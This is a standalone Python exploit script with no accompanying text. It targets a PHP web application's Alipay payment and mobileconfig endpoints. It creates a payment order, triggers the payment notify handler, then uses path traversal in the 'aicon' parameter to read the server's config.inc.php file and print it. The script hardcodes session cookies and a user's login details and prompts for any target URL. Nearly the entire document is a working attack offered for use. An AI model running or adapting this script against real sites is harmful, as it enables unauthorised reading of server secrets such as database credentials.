import requests
import re
import time
def checkbug():
	burp0_url = url+"/source/pack/mobileconfig/ajax.php"
	burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
	urlcode=requests.get(burp0_url, headers=burp0_headers).status_code
	return urlcode
def Get_order():
	burp0_url = url+"/source/pack/alipay/pay.php?rmb=1000"
	burp0_cookies = {"PHPSESSID": "pc079g7m6inb1ukh4h9t1om9e3", "in_userid": in_userid, "in_username": in_username, "in_userpassword": in_userpassword}
	burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
	order_html=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text
	Reorder=re.compile(r'name=\'out_trade_no\' value=\'(.*?)\'')
	return Reorder.findall(order_html)[0]
def Get_date(out_trade_no):
	burp0_url = url+"/source/pack/alipay/pay_notify.php"
	burp0_cookies = {"PHPSESSID": "pc079g7m6inb1ukh4h9t1om9e3", "in_userid": in_userid, "in_username": in_username, "in_userpassword": in_userpassword}
	burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
	burp0_data = {"out_trade_no": out_trade_no}
	Get_header=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).headers
	Date=int(time.mktime(time.strptime(Get_header['Date'],"%a, %d %b %Y %H:%M:%S GMT")))
	return Date
def readfile(userid,Date):
	burp0_url = url+"/source/pack/mobileconfig/ajax.php?ac=mobileconfig&aicon=../../../source/system/config.inc.php"
	burp0_cookies = {"PHPSESSID": "pc079g7m6inb1ukh4h9t1om9e3", "in_userid": in_userid, "in_username": in_username, "in_userpassword": in_userpassword}
	burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh,en;q=0.9,zh-CN;q=0.8", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
	#burp0_data = {"out_trade_no": userid+"-"+str(Date)}
	fileDate_html=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text
	return fileDate_html
def main():
	global in_userpassword,in_userid,in_username,url
	in_userid="2"
	in_username="looksb@qq.com"
	in_userpassword="27d4215b671480e1"
	url=raw_input('readfile url:')
	if checkbug()==200:
		out_trade_no=Get_order()
		Date=Get_date(out_trade_no)
		fileDate_html=readfile(in_userid,Date)
		if(len(fileDate_html)>6):
			print(fileDate_html)
			exit();
		main()
if __name__ == '__main__':
	main()